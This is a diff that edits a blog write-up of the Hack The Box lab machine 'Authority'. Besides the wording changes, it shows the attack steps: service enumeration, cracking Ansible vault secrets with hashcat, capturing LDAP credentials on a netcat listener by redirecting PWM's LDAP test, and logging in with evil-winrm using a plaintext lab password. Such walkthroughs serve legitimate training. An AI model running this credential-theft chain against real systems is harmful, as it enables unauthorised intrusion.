@@ -140,9 +140,10 @@ We can add this to our ```/etc/hosts``` file
 0ph3@parrot~$ echo '10.10.11.222 authority.htb' >> /etc/hosts
 ```
 
-The nmap output has a lot of information so we will try to look at each service individually. 
-It's a good idea prioritize and plan out enumeration when a target has a long list of ports and services.
-Spending a long time trying to brute force 
+The nmap output has a quite a bit of of information.
+It's a good idea prioritize and plan out our enumeration approach when a target has a long list of ports and services to look at.
+Before diving into active directory enumeration on ldap and kerberos, let's look into other common services on the machine to get a more comprehensive information about our attack surface.
+
 
 ### DNS (53/TCP)
 Let's try a DNS zone transfer using the domain name found from ldap
@@ -187,7 +188,7 @@ by Ben "epi" Risher 🤓                 ver: 2.3.3
 If we wanted to go down this IIS rabbit hole we could maybe try IIS tilde enumeration. For now let's move on to the other web service.
 
 ### HTTPS (8443/TCP)
-Navigating to https://10.10.11.222/ redirects to a login page for a [PWM](https://github.com/pwm-project/pwm/) web application. 
+Navigating to https://10.10.11.222:8443/ redirects to a login page for a [PWM](https://github.com/pwm-project/pwm/) web application. 
 Doing some research reveals PWM is a java based application that allows users to login and submit password resets through LDAP.
 Trying some common default credentials on the login page does not have any sucess. It seems that the ldap connection to the directory for authentication is unavailable.
 ![Failed login](/assets/img/posts/HTB/Authority/PWM-Logattempt.png)
@@ -305,7 +306,7 @@ ldap_admin_password: !vault |
 The values we are after seem to be contained in an encrypted Ansible vault. 
 To extract the contents of these vaults, we need to find the secret used to encrypt them
 We can use the ```ansible2john.py``` tool to convert the encrypted blobs into a hash format [hashcat](https://hashcat.net/hashcat/) can use to crack the secret.
-We will start by making sure we place each vault into its own file.
+Let's start by making sure we place each vault into its own file.
 ```console
 0ph3@parrot~$ #ls
 ldap_admin_password  pwm_admin_login  pwm_admin_password
@@ -317,14 +318,14 @@ $ANSIBLE_VAULT;1.1;AES256
 $ANSIBLE_VAULT;1.1;AES256
 313563383439633230633734353632613235633932356333653561346162616664333932633737363335616263326464633832376261306131303337653964350a363663623132353136346631396662386564323238303933393362313736373035356136366465616536373866346138623166383535303930356637306461350a3164666630373030376537613235653433386539346465336633653630356531
 ```
-We can then run ```ansible2john.py``` against all of the vault files to create hashes compatible with ```hashcat``` and redirect the output to the ```ansible_hashes``` file.
+Running ```ansible2john.py``` against all of the vault files will create hashes compatible with ```hashcat``` which we can redirect to the ```ansible_hashes``` file.
 ```console
 0ph3@parrot~$ python3 /home/orph3u5/Downloads/ansible2john.py ldap_admin_password pwm_admin_password pwm_admin_login | tee ansible_hashes
 ldap_admin_password:$ansible$0*0*c08105402f5db77195a13c1087af3e6fb2bdae60473056b5a477731f51502f93*dfd9eec07341bac0e13c62fe1d0a5f7d*d04b50b49aa665c4db73ad5d8804b4b2511c3b15814ebcf2fe98334284203635
 pwm_admin_password:$ansible$0*0*15c849c20c74562a25c925c3e5a4abafd392c77635abc2ddc827ba0a1037e9d5*1dff07007e7a25e438e94de3f3e605e1*66cb125164f19fb8ed22809393b1767055a66deae678f4a8b1f8550905f70da5
 pwm_admin_login:$ansible$0*0*2fe48d56e7e16f71c18abd22085f39f4fb11a2b9a456cf4b72ec825fc5b9809d*e041732f9243ba0484f582d9cb20e148*4d1741fd34446a95e647c3fb4a4f9e4400eae9dd25d734abba49403c42bc2cd8
 ```
-We can now run hashcat against ```ansible_hashes```. We can grep for ```Ansible``` in hashcat's ```help``` section to find the correct mode number.
+Before running hashcat against ```ansible_hashes``` let's grep for ```Ansible``` in hashcat's ```help``` section to find the correct mode number.
 ```console
 0ph3@parrot~$ hashcat --help |grep -i Ansible
   16900 | Ansible Vault                                    | Generic KDF
@@ -361,7 +362,7 @@ Restore.Point....: 32768/14344386 (0.23%)
 Restore.Sub.#1...: Salt:2 Amplifier:0-1 Iteration:9984-9999
 Candidates.#1....: dumbo -> loser69
 ```
-Now that we have the secret used to encrypt the vaults, we extract the information contained using ```ansible-vault``` tool.
+Now that we have the secret used to encrypt the vaults, we can extract the information contained using ```ansible-vault``` tool.
 You can install this tool using pip.
 ```console
 0ph3@parrot~$ pip3 install ansible-vault
@@ -387,8 +388,8 @@ Looking around the application doesn't leak any sensitive information but there 
 
 ![Test LDAP profile functionality](/assets/img/posts/HTB/Authority/Test-LDAP-function.png)
 
-It's likely credentials are sent from the server when trying to establish the ldap connection to the target url. This means we could potentially intercept them if we set the url to our attacker machine.
-let's start by setting up our netcat listener
+If credentials are sent from the server when trying to establish the ldap connection to the target url, we could potentially intercept them if we change the target ldap url to our attacking machine.
+Let's start by setting up our netcat listener
 ```console
 0ph3@parrot~$ nc -nvlp 389
 Ncat: Version 7.92 ( https://nmap.org/ncat )
@@ -399,7 +400,7 @@ Next we will change the ldap url to point to our attacker machine.
 
 ![Changing the target LDAP url](/assets/img/posts/HTB/Authority/edit-ldap-target.png)
 
-After clicking ```Test LDAP Profile``` we receive scredentials for the ```svc_ldap``` domain user on our ```netcat``` listener.
+After clicking ```Test LDAP Profile``` on the PWM page, we receive credentials for the ```svc_ldap``` domain user on our ```netcat``` listener.
 ```console
 0ph3@parrot~$  nc -nvlp 389
 Ncat: Version 7.92 ( https://nmap.org/ncat )
@@ -421,7 +422,7 @@ Ncat: Connection from 10.10.11.222:56551.
 nj$f[2%`{kd.jS% [쐪/TF!;{ܟdb,+̩0̨/̪$(#'kjg@.2-1&*%)
 <SNIP>
 ```
-We can use the credentials to connect to the DC through winrm and retrieve the user flag
+These credentials allow us to connect to the DC through winrm and retrieve the user flag
 ```console
 0ph3@parrot~$ evil-winrm -i 10.10.11.222 --user svc_ldap --password 'lDaP_1n_th3_cle4r!'
                                         
@@ -440,5 +441,7 @@ Mode                LastWriteTime         Length Name
 -ar---         1/9/2024   5:26 PM             34 user.txt
 
 ```
+
+## Privilege Escalation
 
 
